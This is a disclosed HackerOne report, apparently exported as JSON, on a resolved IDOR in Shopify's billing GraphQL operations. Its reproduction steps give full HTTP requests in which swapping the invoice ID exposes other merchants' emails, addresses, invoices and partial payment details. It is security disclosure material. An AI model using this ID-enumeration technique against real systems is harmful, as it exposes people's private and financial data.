{
  "id": 2207248,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjA3MjQ4",
  "url": "https://hackerone.com/reports/2207248",
  "title": "IDOR on GraphQL queries BillingDocumentDownload and BillDetails",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-10-12T23:14:29.683Z",
  "submitted_at": "2023-10-12T23:14:29.838Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "blaklis",
    "url": "/blaklis",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-02-08T15:01:53.719Z",
  "bug_reporter_agreed_on_going_public_at": "2023-11-13T23:43:55.450Z",
  "team_member_agreed_on_going_public_at": "2024-02-08T15:01:53.579Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nAn IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████: \n\n- email\n- full address\n- content of their invoice\n- last 4 digits of credit card + type of credit card OR paypal email\n- shop impacted\n\n## Shops Used to Test:\nTested ID ██████ before I saw it was indeed embedding others' customers data.\n\n## Relevant Request IDs:\nf858a40e-ad0d-407a-a589-3ffb40cc5ae5\n\n## Steps To Reproduce:\n\n1. Whatever the user you're loggedin with, run the following request : \n\n```\nPOST /api/shopify/███?operation=BillDetails&type=query HTTP/2\nHost: admin.shopify.com\nCookie: ██████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nX-Shopify-Web-Force-Proxy: 1\nX-Csrf-Token: ████████\nCaller-Pathname: /store/████████/access_account/invoice/███\nContent-Length: 6674\nOrigin: https://admin.shopify.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-Pwnfox-Color: cyan\nTe: trailers\n\n{\"operationName\":\"BillDetails\",\"variables\":{\"id\":\"████\",\"hasBillingSubscriptionsPermission\":false},\"query\":\"query BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) {\\n  shop {\\n    id\\n    myshopifyDomain\\n    countryCode\\n    createdAt\\n    name\\n    plan {\\n      name\\n      __typename\\n    }\\n    easeMerchantFailedBillManualPaymentAttempts: experimentAssignment(\\n      name: \\\"ease_merchant_failed_bill_manual_payment_attempts\\\"\\n    )\\n    __typename\\n  }\\n  billingAccount {\\n    id\\n    subscription @include(if: $hasBillingSubscriptionsPermission) {\\n      id\\n      billingPeriod\\n      __typename\\n    }\\n    activePaymentMethod {\\n      __typename\\n      ... on BillingBankAccount {\\n        id\\n        bankName\\n        lastDigits\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingCreditCard {\\n        id\\n        brand\\n        lastDigits\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingReseller {\\n        id\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingPaypalAccount {\\n        id\\n        email\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingBalance {\\n        id\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingShopifyBalanceCard {\\n        id\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingManualPayment {\\n        id\\n        compatibleCurrencies\\n        __typename\\n      }\\n      ... on BillingUpiAccount {\\n        id\\n        upiId\\n        compatibleCurrencies\\n        __typename\\n      }\\n    }\\n    ...BillingPaymentMethods\\n    validPaymentMethods\\n    currency\\n    __typename\\n  }\\n  node(id: $id) {\\n    id\\n    ... on BillingInvoice {\\n      id\\n      credits {\\n        name\\n        category\\n        invoiceAmount {\\n          amount\\n          currencyCode\\n          __typename\\n        }\\n        __typename\\n      }\\n      chargeCategories {\\n        shopId\\n        shopName\\n        shopDomain\\n        category\\n        name\\n        description\\n        count\\n        subtotalAmount {\\n          amount\\n          currencyCode\\n          __typename\\n        }\\n        charges {\\n          __typename\\n          discountValue {\\n            __typename\\n            ... on AppSubscriptionDiscountPercentage {\\n              percentage\\n              __typename\\n            }\\n            ... on AppSubscriptionDiscountAmount {\\n              amount {\\n                amount\\n                currencyCode\\n                __typename\\n              }\\n              __typename\\n            }\\n          }\\n          amount {\\n            amount\\n            currencyCode\\n            __typename\\n          }\\n          originalAmount {\\n            amount\\n            currencyCode\\n            __typename\\n          }\\n          exchangeRate\\n          exchangeRateAt\\n          issuedAt\\n          description\\n          title\\n          apiClientId\\n          feeType\\n          hasTraceabilityBetaFlag\\n          chargesUrl: url\\n        }\\n        __typename\\n      }\\n      createdAt\\n      billOn\\n      dueOn\\n      netTerm\\n      status\\n      name\\n      originClassification\\n      prefixBillName\\n      purchaseType\\n      authenticationStatus\\n      strongCustomerAuthenticationPayload {\\n        clientToken\\n        paymentMethodNonce\\n        redirectUrl\\n        type\\n        __typename\\n      }\\n      lastFailureReason\\n      lastFailureMessage\\n      totalAmount {\\n        amount\\n        currencyCode\\n        __typename\\n      }\\n      totalCreditAmount {\\n        amount\\n        currencyCode\\n        __typename\\n      }\\n      subtotalAmount {\\n        amount\\n        currencyCode\\n        __typename\\n      }\\n      refundedAmount {\\n        amount\\n        currencyCode\\n        __typename\\n      }\\n      timeline {\\n        status\\n        date\\n        amount {\\n          amount\\n          currencyCode\\n          __typename\\n        }\\n        __typename\\n      }\\n      paymentMethod {\\n        __typename\\n        ... on BillingBankAccount {\\n          id\\n          bankName\\n          lastDigits\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingCreditCard {\\n          id\\n          brand\\n          lastDigits\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingReseller {\\n          id\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingPaypalAccount {\\n          id\\n          email\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingBalance {\\n          id\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingManualPayment {\\n          id\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingUpiAccount {\\n          id\\n          upiId\\n          synchronous\\n          __typename\\n        }\\n        ... on BillingShopifyBalanceCard {\\n          id\\n          synchronous\\n          __typename\\n        }\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment BillingPaymentMethods on BillingAccount {\\n  id\\n  paymentMethods {\\n    __typename\\n    ... on BillingBankAccount {\\n      id\\n      priority\\n      bankName\\n      lastDigits\\n      verificationStatus\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingCreditCard {\\n      id\\n      priority\\n      brand\\n      lastDigits\\n      expired\\n      expiryMonth\\n      expiryYear\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingShopifyBalanceCard {\\n      id\\n      priority\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingReseller {\\n      id\\n      priority\\n      uid\\n      handle\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingPaypalAccount {\\n      id\\n      priority\\n      email\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingBalance {\\n      id\\n      priority\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingShopifyBalanceAccount {\\n      id\\n      priority\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingUpiAccount {\\n      id\\n      priority\\n      upiId\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n    ... on BillingManualPayment {\\n      id\\n      priority\\n      synchronous\\n      compatibleCurrencies\\n      __typename\\n    }\\n  }\\n  __typename\\n}\\n\"}\n```\n\nThat will give you some infos about the invoice.\n\nYou can also download the PDF of the invoice, with different infos embedded in it : \n\n```\nPOST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2\nHost: admin.shopify.com\nCookie: ██████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nX-Shopify-Web-Force-Proxy: 1\nX-Csrf-Token: ████\nCaller-Pathname: /store/█████████/access_account/invoice/██████\nContent-Length: 433\nOrigin: https://admin.shopify.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-Pwnfox-Color: cyan\nTe: trailers\n\n{\"operationName\":\"BillingDocumentDownload\",\"variables\":{\"id\":\"████\",\"documentType\":\"CREDIT_NOTE\"},\"query\":\"mutation BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) {\\n  billingDocumentDownload(id: $id, documentType: $documentType) {\\n    job {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\nReplace in the request the cookies, the shop name and the CSRF token, then access https://admin.shopify.com/store/*yourshop*/invoices/*theid*/download.html?document_type=INVOICE\n\nFunnily enough, the PDF invoice display my own firstname / lastname, but will display the other merchants' email and full address.\n\n## Impact\n\n## Summary:\n\nAn attacker is able to dump ███ merchants through their invoices.",
  "bounty_amount": "5000.0",
  "formatted_bounty": "$5,000",
  "weakness": {
    "id": 55,
    "name": "Insecure Direct Object Reference (IDOR)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 65,
  "voters": [
    "b19r8a14",
    "prathap_ilango",
    "skoll101",
    "theyknow",
    "8910jq",
    "n1m0",
    "smile_for_bugs",
    "ganeshbagaria",
    "drsniper",
    "zy9ard3",
    "and 55 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 424699,
    "asset_type": "URL",
    "asset_identifier": "admin.shopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 400213,
      "category": "team",
      "content": "There was an IDOR vulnerability that affected the BillingInvoice ID in both the BillingDocumentDownload and BillDetails GraphQL operations. Staff could gain access to some information on other shops through this IDOR.\n\n\n",
      "user": {
        "id": 2464566,
        "username": "dkma_shopify",
        "name": "dkma_shopify",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2022-09-20T18:28:31.660Z",
        "url": "https://hackerone.com/dkma_shopify",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/q06tzvw4s6zqutji40badnbrhc31/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/q06tzvw4s6zqutji40badnbrhc31/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/q06tzvw4s6zqutji40badnbrhc31/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 400225,
      "category": "researcher",
      "content": "An IDOR with numerical, predictable (incremental) ID allowed anyone to dump billing details for every other shops, which allowed to leak some PII and details from every other Shop owners/employees, through Billing GraphQL operations.",
      "user": {
        "id": 344381,
        "username": "blaklis",
        "name": "Blaklis",
        "bio": "",
        "cleared": true,
        "verified": true,
        "website": "https://www.blakl.is",
        "location": "",
        "created_at": "2018-09-04T09:47:16.415Z",
        "url": "https://hackerone.com/blaklis",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
